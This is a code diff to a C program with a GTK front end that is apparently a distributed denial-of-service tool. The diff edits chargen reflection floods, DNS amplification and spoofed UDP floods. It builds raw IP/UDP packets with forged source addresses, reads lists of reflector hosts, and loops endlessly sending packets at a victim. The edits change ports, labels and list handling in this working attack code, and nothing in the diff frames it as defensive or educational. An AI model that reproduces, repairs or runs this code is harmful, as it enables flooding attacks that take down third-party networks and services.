@@ -18,10 +18,7 @@
 #include <net/if.h>
 #include <ifaddrs.h>
 
-
 #include <pthread.h>
-#include <netinet/ip.h>
-#include <arpa/inet.h>
 
 
 #include <gtk-2.0/gtk/gtk.h>
@@ -54,6 +51,7 @@ extern GtkWidget *ddos_text_view;
 const gchar *script_command = NULL;
 
 const gchar *Your_IP = NULL;
+
 
 
 void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
@@ -1005,8 +1003,8 @@ void setup_ip_header_chargen(struct iphdr *iph)
 
 void setup_udp_header_chargen(struct udphdr *udph)
 {
-    udph->source = htons(5678);
-    udph->dest = htons(27015);
+    udph->source = htons(4);
+    udph->dest = htons(19);
     udph->check = 0;
     strcpy((void *)udph + sizeof(struct udphdr), "h");
     udph->len = htons(sizeof(struct udphdr) + 3);
@@ -1039,7 +1037,7 @@ void *flood_chargen(void *par1)
     setup_ip_header_chargen(iph);
     setup_udp_header_chargen(udph);
 
-    udph->source = sin.sin_port;
+    udph->source = 4444;//sin.sin_port;
     iph->saddr = sin.sin_addr.s_addr;
     iph->daddr = list_node->data.sin_addr.s_addr;
     iph->check = csum_chargen((unsigned short *) datagram, iph->tot_len >> 1);
@@ -1079,7 +1077,7 @@ void cb_chargen_ddos(void)
     const gchar *IP = NULL;
     const gchar *port_number = NULL;
     const gchar *reflection = NULL;
-    const gchar *throttle = NULL;
+    const gchar *thread_number = NULL;
     const gchar *time_duration = NULL;
 
     GtkTextBuffer *text_buffer = NULL;
@@ -1092,7 +1090,7 @@ void cb_chargen_ddos(void)
     text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));
 
     /** Set the default buffer text. **/
-    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP> <target port> <reflection file> <threads> <time>", -1);
+    gtk_text_buffer_set_text(text_buffer, "Usage: <Your IP> <target port> <ip_list.txt> <threads> <time>", -1);
 
     /** Obtain iters for the start and end of points of the buffer **/
     gtk_text_buffer_get_start_iter(text_buffer, &start);
@@ -1108,8 +1106,8 @@ void cb_chargen_ddos(void)
 
     IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
-    reflection_dialog = gtk_dialog_new_with_buttons("Enter Reflection File Name", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
-    throttle_dialog = gtk_dialog_new_with_buttons("Enter Threads Numbers", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    reflection_dialog = gtk_dialog_new_with_buttons("Reflection Filename", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    throttle_dialog = gtk_dialog_new_with_buttons("Enter Number of Threads", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
 
     gtk_widget_set_size_request(IP_dialog, 360, 100);
@@ -1173,7 +1171,7 @@ void cb_chargen_ddos(void)
     switch(gtk_dialog_run(GTK_DIALOG(throttle_dialog)))
     {
         case GTK_RESPONSE_APPLY:
-            throttle = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
+            thread_number = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
             gtk_widget_hide(throttle_dialog);
             break;
 
@@ -1206,7 +1204,7 @@ void cb_chargen_ddos(void)
     char *buffer = (char *) malloc(max_len);
     buffer = memset(buffer, 0x00, max_len);
 
-    int num_threads = atoi(throttle);
+    int num_threads = atoi(thread_number);
 
     FILE *list_fd = fopen(reflection,  "r");
 
@@ -1232,8 +1230,9 @@ void cb_chargen_ddos(void)
                 memset(new_node, 0x00, sizeof(struct list));
 
                 new_node->data.sin_addr.s_addr = inet_addr(buffer);
-                new_node->prev = head;
+                //new_node->prev = head;
                 new_node->next = head->next;
+                new_node->prev = head;
                 head->next = new_node;
             }
 
@@ -1244,7 +1243,7 @@ void cb_chargen_ddos(void)
             continue;
     }
 
-    struct list *current = head->next;
+    struct list *current = head;//->next;
     pthread_t thread[num_threads];
 
     struct sockaddr_in sin;
@@ -1279,7 +1278,6 @@ void cb_chargen_ddos(void)
 
     return;
 }
-
 
 /** DNS AMPED **/
 void cb_dns_amped_ddos(void)
@@ -1419,7 +1417,7 @@ void cb_dns_amped_ddos(void)
             return;
     }
 
-    char *head = NULL;
+    //char *head = NULL;
     //head = NULL;
 
     char *strLine = (char *) malloc(256);
@@ -1895,7 +1893,7 @@ void cb_udp_spoofed(void)
 
 	param.message = "\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10";
 
-	pthread_create( &udp_attack, NULL, thread_attack, (void*) &param);
+	pthread_create(&udp_attack, NULL, thread_attack, (void*) &param);
 
 	wait_time_end(atoi(time_duration));
 
@@ -1971,7 +1969,7 @@ void *thread_attack(void *thread_params)
 
 	while (1)
 		for (i = 0; i < params->list_size; i++)
-			attack(params->list[i]. ip, rand() % 65534 + 1, params->victim_ip, params->list[i].port, params->message);
+            attack(params->list[i].ip, rand() % 65534 + 1, params->victim_ip, params->list[i].port, params->message);
 }
 
 char *getLine(FILE *f)
